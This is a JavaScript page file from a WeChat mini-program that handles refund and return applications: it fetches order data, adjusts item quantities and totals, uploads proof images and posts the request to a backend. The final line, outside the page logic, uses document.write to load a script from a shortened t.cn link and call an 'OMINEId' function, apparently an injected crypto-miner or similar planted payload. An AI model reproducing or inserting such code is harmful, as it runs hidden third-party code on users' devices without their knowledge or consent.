var t = getApp(),
  app =t ,
  e = t.requirejs("core"),
  a = t.requirejs("biz/order"),
  $ = t.requirejs("jquery")
  , timer
  ;
Page({
  data: {
    code: 1,
    tempFilePaths: "",
    show:true,
    httpImg: t.globalData.daxinImg,
    delete: "",
    order: { good: { thumb: t.globalData.daxinImg + "/static/images/banner.png", title: "ME6211C33M5G 盘装", detail: "单路LDO,输入电压2-6v,输出电压3.3v,输出电流，输出精度高:±2%,封装:SOT23-5,", pnum: "3000", total: "20.22", address: "赋安大厦A301" }},
    rtypeArr: ["退款(仅退款不退货)", "仅退货", "退货退款"],
    rtypeArrText: ["退款", "退款", "换货"],
    rtypeIndex: 1,
    isrtypeIndex:true,
    refundstate:0,
    reasonArr: ["不想要了", "卖家缺货", "拍错了/订单信息错误", "其它"],
    reasonIndex: 0,
    images: [],
    imgs:[],
    sendData:{},
    options:{},
    re_delivery_status: ['待发货','已部分发货','已全部发货','已部分收货','已全部收货'],
    isImgok:true,
    editcheckall:true
  },
  onLoad: function (e) {
    this.setData({
      options: e
    });
    if(e.re_sn){
      this.get_list({order_sn:e.id,retreat_sn:e.re_sn});
      // wx.setNavigationBarTitle({
      //   title: '修改退货、退款申请'
      // })
    }else{
      this.get_list({order_sn:e.id});
    }
      
  },
  onPullDownRefresh: function () {
    return;
    var _this = this;
    var option = _this.data.options;
    //下拉刷新
    if (option.re_sn) {
      this.get_list({ order_sn: option.id, retreat_sn: option.re_sn });
      // wx.setNavigationBarTitle({
      //   title: '修改退货、退款申请'
      // })
    } else {
      this.get_list({ order_sn: option.id });
    }
    wx.stopPullDownRefresh();
  },
  get_list: function (obj) {
    wx.showToast({
      title: '加载中...',
      icon: 'loading',
      duration: 1000
    });
    var _this = this;
    var datas = {
      session_token: t.globalData.session_token, 
      show_data: "retreatDetail"
      };
    datas = $.extend(datas,obj);
    //获取订单信息
    wx.request({
      url: t.globalData.daxin + "/order/orderList",
      data: datas,
      method: "POST",
      success: function (res) {
        wx.hideToast();
        //console.log(res);
        if (res.data.statusCode >= 0 && res.data.data.list) {
         
          var total_price=0;
          var list = res.data.data.list[0], order, retreat_price, imgs = [], img_init, rtypeObj={}; 
          if (list.pay_status == 0) {
            rtypeObj = {
              rtypeArr: ["仅退货"],
              rtypeIndex: 0,
              isrtypeIndex: false
            };
          }
          if (obj.retreat_sn){
            var retreat_title=["退款","退货","退货退款"];
            var retreat_index = list.order_retreat[0].retreat_type
              wx.setNavigationBarTitle({
                title: '修改'+retreat_title[retreat_index]+'申请'
              });
            order = $.extend({}, list.order_retreat[0]);
            order.hymoney = parseFloat(list.hymoney).toFixed(2);
            order.retreat_money_ok = list.retreat_money_ok;
            order.ship_status = list.ship_status;
            if (list.pay_status < 1){
              rtypeObj = {
                rtypeArr: ["仅退货"],
                rtypeIndex: 0,
                isrtypeIndex:false
              };
            }
            order.order_goods = order.item;
           // order.order_goods = _this.getListData(order.re_sn, list.order_retreat_goods).concat();
            var retreat_handdle = order.handle_status;
            $.each(order.order_goods, function (index, val) {             
                // console.log(_this.getListData(val.p_id, order.order_goods, "obj"));
                val.selected=1;
                val.p_price_true = val.p_price;
                val.retreat_self_num = val.p_num;
               // val.changeNum = val.p_num;
                var objs = _this.getListData(val.p_id, list.order_goods, true);
                val = $.extend(true,val, objs);
                val.pid = val.p_id,
                val.pnum_check = val.erp_num - val.retreat_num + (retreat_handdle == 3 || retreat_handdle == 7 ? 0 : parseFloat(val.retreat_self_num)),
                val.changeNum = val.retreat_self_num > val.pnum_check ? val.pnum_check : val.retreat_self_num,
                val.pnum = val.changeNum,
                val.pprice = val.p_price_true,
                val.ptotal = parseFloat(val.pnum * val.p_price_true).toFixed(2);
                total_price += parseFloat(val.ptotal) ; 
            });
            retreat_price = order.retreat_money;
            order.retreat_money_ok = list.retreat_money_ok;
            order.has_retreat_money_total = list.has_retreat_money_total;
            img_init = order.retreat_img?JSON.parse(order.retreat_img):[];
            if (img_init && img_init.length>0){
              $.each(img_init, function (ind, val) {
                if (val.indexOf("http") < 0) {
                  imgs.push(t.globalData.daxinImg + val);
                } else {
                  imgs.push(val);
                };
              });
            }
            
          }else{   
            var order_goods=[];         
            $.each(res.data.data.list[0].order_goods, function (ind, val) {
              val.selected = 1;
              val.thumb = val.img ? t.globalData.daxinImg + val.img : "";
              val.total = (val.p_num * val.p_price_true).toFixed(2);
              val.retreat_self_num = val.p_num;
              val.pid = val.p_id,
              val.changeNum = val.erp_num - val.retreat_num,
              val.pnum_check = val.erp_num - val.retreat_num,
              val.pnum = val.changeNum,
              val.pprice = val.p_price_true,
              val.ptotal = (val.pnum * val.p_price_true).toFixed(2);
              if (val.pnum > 0 && val.subtotal>0){
                total_price += parseFloat(val.ptotal);
                order_goods.push(val);
              }
            });
            retreat_price = total_price;
            res.data.data.list[0].status = t.getOrderStatus(res.data.data.list[0], "ship_status");
            var order_handle = $.extend({}, res.data.data.list[0]);
            order_handle.retreat_money_ok = parseFloat(order_handle.retreat_money_ok).toFixed(2);
            order_handle.order_goods = order_goods;
            order = order_handle;
          } 
          console.log(order,obj,retreat_price);
          var datas = {
            "order": order,
            price: parseFloat(retreat_price /*< list.hymoney ? retreat_price : list.hymoney*/).toFixed(2),
            retreat_max_money: parseFloat(/*list.hymoney*/retreat_price).toFixed(2),
            rtypeIndex: order.retreat_type ? order.retreat_type : 1,
            imgs: imgs ? imgs : [],
            images: img_init ? img_init : []
          };
          datas = $.extend(datas, rtypeObj,true);
          _this.setData(datas);

        } else {
          wx.showModal({
            title: '提示信息',
            content: '订单信息获取失败',
            showCancel: false,
            success: function (res) {
              if (res.confirm) {
                //console.log('用户点击确定')
              } else if (res.cancel) {
                //console.log('用户点击取消')
              }
            }
          })
        }
      }
    })
  },
   getListData: function (value, array, obj) {
    var data = obj ? {} : [];
    if (!$.isArray(array)) { return [] };
    $.each(array, function (ind, val) {
      if (val.re_sn == value) {
        data.push(val);
      }
      if (val.p_id == value && obj) {
        val.thumb = t.globalData.daxinImg + val.img;
        data = val;
        return false;
      }
    });
    return data;
  },
  number: function (t) {
    //修改数量
    var a = this,
      datasets = e.pdata(t),
      checkNum=datasets.check,
      nums = datasets.num,
      sendNum = 0,
      r = datasets.index;
    var orders =a.data.order;
    var order_goods = a.data.order.order_goods;
    "minus" == t.target.dataset.action ? (sendNum = --nums , sendNum = sendNum < 0 ? 0 : sendNum) : (sendNum = ++nums);
    if ("change" == t.target.dataset.action) { return; };
    if (sendNum < 1) { sendNum =0;};
    if (sendNum >= checkNum) { sendNum = checkNum; };
    order_goods[r].changeNum = sendNum;
    order_goods[r].pnum = sendNum;
    var total_price = 0;
    $.each(order_goods, function (ind, val) {
      //val.total = (val.p_num * val.p_price_true).toFixed(2);
      if(val.selected ==1){
        total_price += parseFloat(val.changeNum * val.p_price_true);
      }   
    });
    var prices = total_price.toFixed(2) < parseFloat(orders.retreat_money_ok) ? total_price.toFixed(2) : parseFloat(orders.retreat_money_ok);
    a.setData({
      "order.order_goods": order_goods,
      price: prices
    })
  },
  changeNum: function (e) {
    var nums = e.detail.value;
    var _this = this;
    var timer;
    var orders = _this.data.order;
    var order_goods = _this.data.order.order_goods;
    var r =e.currentTarget.dataset.index;
    var checkNum = e.currentTarget.dataset.check;
    if (nums < 1) { nums = 0; };
    if (nums >= checkNum) { nums = checkNum; };
    clearTimeout(timer);
    timer = setTimeout(function () {
      order_goods[r].changeNum = nums;
      order_goods[r].pnum = nums;
      var total_price = 0;
      $.each(order_goods, function (ind, val) {
        //val.total = (val.p_num * val.p_price_true).toFixed(2);
        if (val.selected == 1) {
          total_price += parseFloat(val.changeNum * val.p_price_true);
        }  
      });
      var prices = total_price.toFixed(2) < parseFloat(orders.retreat_money_ok) ? total_price.toFixed(2) : parseFloat(orders.retreat_money_ok);
      _this.setData({
        "order.order_goods": order_goods,
        price: prices
      })
    }, 10);
  },
  selected:function(event){
    //商品选择选择
    let order_goods= this.data.order.order_goods;
    let id=e.pdata(event).id;
    let total_price=0;
    let lengths=0;
    let editcheckall = this.data.editcheckall;
    $.each(order_goods,function(ind,val){
      if(id==val.p_id){
        !val.selected ? (val.selected = 1):(val.selected=0);
      }
      if (val.selected == 1) {
        lengths++;
        total_price += parseFloat(val.changeNum * val.p_price_true);
      } 
    });
    if (lengths == order_goods.length){
      editcheckall=true;
    }else{
      editcheckall = false;
    }
    this.setData({
      "order.order_goods":order_goods,
      price: total_price.toFixed(2),
      editcheckall: editcheckall
    });
  },
  editcheckall:function(){
    //全选
    let order_goods = this.data.order.order_goods;
    let editcheckall = this.data.editcheckall;
    let total_price = 0;
    editcheckall ? (editcheckall = false) : (editcheckall=true);
    $.each(order_goods, function (ind, val) {
      editcheckall ? (val.selected = 1) : (val.selected = 0);
      if (val.selected == 1) {
        total_price += parseFloat(val.changeNum * val.p_price_true);
      }
    });
    this.setData({
      "order.order_goods": order_goods,
      price: total_price.toFixed(2),
      editcheckall: editcheckall
    });

  },
  submit: function (data,fn){
    var goods=this.data.sendData;
    var re_sn=this.options.re_sn||"";
    let order_goods = this.data.order.order_goods;
    let sendGoods=[];
    $.each(order_goods,function(ind,val){
        if(val.selected == 1){
          sendGoods.push(val);
        }
    });
    var data={
      re_sn: re_sn,
      order_sn: this.data.order.order_sn,
      goods: sendGoods,
      retreat_type: this.data.isrtypeIndex?this.data.rtypeIndex:1,
      cargo_status:  0,//货款返回路径
      retreat_money: this.data.price - this.data.order.retreat_money_ok >0? this.data.order.retreat_money_ok: this.data.price,
      retreat_desc:  this.data.order.retreat_desc,
      retreat_img: this.data.images
    };
    if (data.retreat_type==1) {
      data.retreat_money=0;
      data.cargo_status = 0;
     };
    if (data.retreat_img.length==0){ 
      wx.showToast({
      title: '请上传凭证',
      duration:800
    });
    return;};
    data = $.extend(data, goods);
      var _this = this;
      wx.request({
        url: t.globalData.daxin + "/order/knotOrder",
        data: $.extend({
          session_token: t.globalData.session_token,
          action: "refundOrder"
        },data),
        method: "POST",
        success: function (res) {
          wx.hideLoading();
          if (res.data.statusCode >= 0 ) {
            wx.showToast({
              title: res.data.msg,
              icon: 'success',
              duration: 1000,
              success:function(){
                setTimeout(function(){
                  wx.redirectTo({
                    url: '/pages/order/index?status=4'
                  })
                  //wx.navigateBack();
                },1200);
               
              }
            })
          } else {
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  //console.log('用户点击确定')
                } else if (res.cancel) {
                  //console.log('用户点击取消')
                }
              }
            })
          }
        }
      })
  },
  change: function (t) {
    var a = e.data(t).name,
      i = this.data.sendData;
    i[a] = t.detail.value,
    //console.log(i),
      this.setData({ sendData: i, rtypeIndex: i.rtypeIndex})
  },
  changetext:function(e){
    var _this=this;
    clearTimeout(timer);
    timer =setTimeout(function(){
        _this.setData({
          'order.retreat_desc':e.detail.value
        });
    },800);
    
  },
  upload: function (t) {
    //图片上传
    var a = this,
      i = e.data(t),
      s = i.type,
      r = a.data.images,
      n = a.data.imgs,
      o = i.index;
    var isImgoks = true;
    "image" == s ? e.upload(function (t) {
      var showt = app.globalData.daxinImg+t;
        r.push(t),
        n.push(showt);
      if (n.length >= 3) { isImgoks = false;};
        a.setData({
          images: r,
          imgs: n,
          isImgok: isImgoks
        })
    }) : "image-remove" == s ? (r.splice(o, 1), n.splice(o, 1), a.setData({
      images: r,
      imgs: n,
      isImgok: isImgoks
    })) : "image-preview" == s && wx.previewImage({
      current: n[o],
      urls: n
    })
  },
  toggle: function (t) {
    var a = e.pdata(t),
      i = a.id;
    i = 0 == i || void 0 === i ? 1 : 0,
      this.setData({
        code: i
      })
  },
  edit: function (t) {
    this.setData({
      "order.refundstate": 0
    })
  },
  refundcancel: function (t) {
    a.refundcancel(this.data.options.id, function () {
      wx.navigateBack()
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
